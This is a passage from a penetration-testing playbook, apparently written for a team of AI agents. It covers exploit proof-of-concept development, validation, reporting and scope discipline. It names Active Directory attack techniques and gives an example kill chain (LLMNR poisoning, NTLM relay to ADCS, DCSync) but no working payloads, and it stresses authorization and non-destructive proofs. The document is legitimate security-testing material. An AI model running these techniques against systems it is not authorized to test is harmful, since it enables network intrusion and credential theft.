### 8.2 Lab replication & PoC development

- **Objective / hypothesis:** A reliable PoC can be built/tuned against a controlled replica of the target service.
- **Procedure:**
```bash
# Stand up the matching version in a lab VM/container, develop offset/payload there,
# and stage the artifact and a non-destructive proof variant in the run dir.
mkdir -p "$RUN_DIR/loot/exploits"
# (develop) -> validate the non-destructive proof (e.g. read a known file / run `id`) in lab first.
```
- **Indicators:** PoC reliably triggers the intended primitive (read/exec) in the lab without crashing the service.
- **Validation:** Run the non-destructive variant against the in-scope target only after lab reliability is established; capture the proof artifact.
- **Evasion / edge cases:** Memory-corruption exploits are inherently crash-risky — only against production with explicit sign-off and a restore plan. Build a "safe check" variant that proves vulnerability without the dangerous primitive whenever possible.
- **Severity:** Inherited from the CVE; realized impact captured here.
- **Dispatch:** -> ExploitDevAgent

### 8.3 Controlled execution & proof

- **Objective / hypothesis:** The vulnerability is exploitable on the in-scope target with controlled, evidenced impact.
- **Procedure:**
```bash
# Execute the vetted PoC against the authorized target; capture full output + pcap.
# Prefer a benign post-exploitation proof (whoami/hostname/id), not destructive actions.
```
- **Indicators:** Controlled primitive succeeds (command output / file read) and is captured.
- **Validation:** ValidatorAgent reproduces from the captured artifact in Phase 9.
- **Evasion / edge cases:** Time exploitation to minimize blast radius; have rollback ready; never chain into destructive persistence on production.
- **Severity:** As scored for the CVE; combined impact elevated in Phase 9 chaining.
- **Dispatch:** -> ExploitDevAgent

**Phase artifacts:** `scans/{searchsploit_full,cve_list}.txt`, `loot/exploits/*`, proof captures + pcap.

**Gate-out:** Each authorized CVE either proven (with safe evidence) or documented as not safely exploitable.
```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --phase weaponize --status completed \
  --findings "$RUN_DIR/findings/phase8-weaponize.json"
```

---

## Phase 9: VALIDATION, REPORTING & HAND-OFF

**Owner:** ValidatorAgent (`validate`) then ExploitChainAgent (`chain`).

**Objective & expert rationale.** Convert raw findings into a defensible report. Every finding is independently reproduced, de-duplicated by root cause, CVSS-scored, and gated by hunt mode; then findings are correlated into kill chains whose combined severity exceeds the parts. False positives are killed here, not in the report.

**Gate-in.** Findings emitted by Phases 3-8 into `$RUN_DIR/findings/`.

### 9.1 Aggregate findings

- **Procedure:**
```bash
jq -s 'add' "$RUN_DIR/findings"/phase*-*.json > "$RUN_DIR/findings/all_findings.json"
echo "[*] Raw findings: $(jq length "$RUN_DIR/findings/all_findings.json")"
```
- **Indicators:** Consolidated finding set with phase, host, technique, evidence path.
- **Dispatch:** -> ValidatorAgent

### 9.2 Validate, de-duplicate, score (ValidatorAgent)

- **Procedure:** For each finding, ValidatorAgent re-runs the exact reproduction command from a clean state, confirms the indicator, de-duplicates by root cause (e.g. ten hosts missing SMB signing = one root-cause finding with ten affected assets), assigns a CVSS 3.1 vector (and 4.0 where the program uses it), and applies the hunt-mode gate (`bounty` CVSS>=8.0 / `pentest` CVSS>=4.0 / `comprehensive` all).
```bash
# Each confirmed finding is recorded with mode-gated severity
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" \
  --add-finding '{"severity":"critical","type":"ADCS-ESC8","title":"Coerced DC auth relayed to ADCS -> DA","cvss":"9.8"}'
# Redact any secrets from working notes before they enter the report
bun "$TOOLS/credential-vault.ts" --redact --file "$RUN_DIR/reports/draft_notes.md"
```
- **Indicators:** Reproduced=true per finding; duplicates collapsed; severities assigned; secrets redacted.
- **Validation:** A finding that cannot be reproduced from its artifact is dropped or downgraded to informational with a note.
- **Dispatch:** -> ValidatorAgent

### 9.3 Correlate into kill chains (ExploitChainAgent)

- **Procedure:** ExploitChainAgent links validated findings into attack chains and elevates combined severity where the chain's impact exceeds the individual links.
```bash
cat > "$RUN_DIR/reports/kill_chains.md" <<'EOF'
## Kill Chain: Anonymous -> Domain Admin
1. Initial Access: LLMNR poisoning captured svc_backup NetNTLMv2 (4.3)
2. Credential Access: cracked offline -> cleartext (4.6)
3. AD Foothold: BloodHound shows svc_backup has GenericWrite on FILESRV01 (5.1)
4. Escalation: Shadow Credentials -> FILESRV01$ NT hash (5.7)
5. Coercion+Relay: PetitPotam DC01 -> ntlmrelayx -> ADCS ESC8 -> DC cert (4.4/4.5/5.8)
6. Domain Compromise: cert auth -> DCSync krbtgt (5.9)

Combined severity: CRITICAL (CVSS 9.8) — full domain takeover from unauthenticated position.
EOF
```
- **Indicators:** Documented multi-step chains with a single elevated severity and the full evidence trail.
- **Validation:** Each step references a reproduced finding; the chain is walked end-to-end at least once.
- **Dispatch:** -> ExploitChainAgent

### 9.4 Final report & concise update

- **Procedure:** Assemble the report from validated findings and chains; produce a concise N-point summary of the new tests performed this run.
```bash
mkdir -p "$RUN_DIR/reports"
# Each finding: title, MITRE ATT&CK ID, severity + CVSS vector, affected assets,
# step-by-step reproduction (exact commands), evidence (pcap/screenshot/redacted output),
# business impact, prioritized remediation.
```
Concise update format (example):
```
New tests this run (network engagement):
1. Full TCP + top-UDP + safe-NSE inventory across N live hosts.
2. SMB null/guest, signing, MS17-010, share spider across the estate.
3. Per-service exploitation: RDP/SSH/SNMP/SMTP/LDAP/NFS/rsync/FTP-TFTP/DBs/printers/appliances.
4. Lockout-aware spray + Responder/mitm6 capture + PetitPotam/Coercer relay.
5. AD graph: BloodHound paths, Kerberoast/AS-REP, delegation (unconstr/constr/RBCD), ACL+shadow, ADCS ESC1-13, DCSync, GPO.
6. Lateral: PtH/PtT/PtK, WMI/WinRM/DCOM, LSASS/SAM/DPAPI harvest, ligolo-ng/chisel pivots.
7. Single-host Windows/Linux privesc; targeted CVE weaponization where required.
```
- **Report output:** `~/.claude/MEMORY/BugBounty/Sessions/{target-slug}/reports/network_assessment_report.md`
- **Dispatch:** -> ValidatorAgent (final QA) -> ExploitChainAgent (chain section)

**Gate-out:** Report written; all secrets redacted; pcap stopped and stored.
```bash
kill "$(cat "$RUN_DIR/pcap/tcpdump.pid")" 2>/dev/null
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --phase reporting --status completed \
  --findings "$RUN_DIR/findings/all_findings.json"
```

---

## Agent Coordination Matrix

| Phase | Stage key | Primary agent | Supporting | Data flow |
|-------|-----------|---------------|------------|-----------|
| 1 Discovery | recon | ReconAgent | — | live_hosts.txt, subnet_density.txt |
| 2 Enumeration | recon | ReconAgent | — | service_summary, ad/db/web/dc lists |
| 3 Services | services | NetworkServiceAgent | ExploitDevAgent | service findings, relay list, loot |
| 4 Credentials | services/directory | NetworkServiceAgent, ActiveDirectoryAgent | — | creds, relay sessions |
| 5 Active Directory | directory | ActiveDirectoryAgent | — | BloodHound paths, hashes, certs |
| 6 Lateral Movement | move | LateralMovementAgent | ActiveDirectoryAgent | owned hosts, harvested creds, pivots |
| 7 Host Privesc | host | WindowsAgent | — | SYSTEM/root proofs |
| 8 Weaponize | weaponize | ExploitDevAgent | NetworkServiceAgent | PoCs, controlled-exec proofs |
| 9 Validation/Report | validate / chain | ValidatorAgent, ExploitChainAgent | All | validated findings, kill chains, report |

---

## Severity Escalation Triggers

These findings auto-escalate to Critical and trigger immediate notification:

- Domain Admin / Enterprise Admin obtained.
- DCSync successful (krbtgt extracted).
- Unauthenticated RCE on any host (MS17-010, BlueKeep, appliance CVE, Redis/Mongo unauth).
- ADCS misconfiguration enabling domain escalation (ESC1-ESC13).
- NTLM coercion + relay leading to privileged code execution or a DC/privileged certificate.
- Unconstrained delegation on a compromisable host.
- Default/weak credentials on a DC, CA, hypervisor, or critical infrastructure.
- Cleartext credentials in GPP/SYSVOL or recovered from a network printer/appliance.
- Empty/weak `sa` or postgres superuser yielding host RCE.

---

## Operational Security & Scope Discipline

- **Scope guard on every active step.** `in_scope "$host"` is checked before any enumeration or exploitation. Out-of-scope hosts are skipped and logged. A pivot does not extend scope.
- **DoS-prone techniques are sign-off gated.** No `--script vuln/intrusive`, `rdp-vuln-ms12-020`, `smb-flood`, `*-dos`, ZeroLogon destructive variant, BlueKeep/memory-corruption exploits, kernel exploits, SNMP/printer config writes, or Redis/SSH-key persistence on production without explicit written authorization and a restore plan. Detection-only by default.
- **Lockout-aware spraying.** Read `--pass-pol` first; never exceed `threshold - 1` (prefer `- 2`) attempts per observation window across the entire user set; one password per window with jitter; exclude locked/canary accounts; log every attempt with timestamps. Prefer Kerberos pre-auth spray (kerbrute) and offline cracking over online brute force of AD accounts.
- **Proxy and capture.** HTTP-bearing traffic through Burp (`http://127.0.0.1:8080`) with a browser UA; raw L4 protocols captured to scoped pcap in the run dir. Every claim has a wire-level or screenshot artifact.
- **Credential handling.** All creds/hashes/tickets stored encrypted in the vault, never inlined in commands or artifacts; reports run through `credential-vault.ts --redact`. Purge per the Rules of Engagement at end of engagement.
- **Persistence is documented, not deployed.** Golden/Silver tickets, Skeleton Key, AdminSDHolder, SID-History, and ADCS golden-certificate vectors are described as risk, not installed, unless scope explicitly permits.
- **Restore state.** Any modification made to prove impact (xp_cmdshell toggle, ACL/SPN/group edits, RBCD attributes, template/CA changes, SNMP values, scratch DB tables, created computer objects) is reverted and the revert is recorded.
- **Tear down.** Stop pcap, close tunnels, remove created objects, and confirm no accounts are left locked out before closing the engagement.
